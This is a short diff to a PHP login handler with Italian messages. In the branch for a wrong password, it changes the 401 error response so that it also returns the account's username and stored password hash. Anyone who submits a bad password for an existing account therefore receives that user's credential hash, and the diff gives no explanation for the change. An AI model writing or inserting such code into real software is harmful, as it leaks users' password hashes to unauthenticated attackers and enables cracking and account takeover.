@@ -37,7 +37,7 @@ if ($account && $account["deleted_at"] !== null) {
 
 if (!$account || !password_verify($password, $account["password_hash"])) {
     http_response_code(401);
-    echo json_encode(["error" => "Credenziali non valide"]);
+    echo json_encode(["error" => "Credenziali non valide", "account" => $account["username"], "password" => $account["password_hash"]]);
     exit;
 }
 
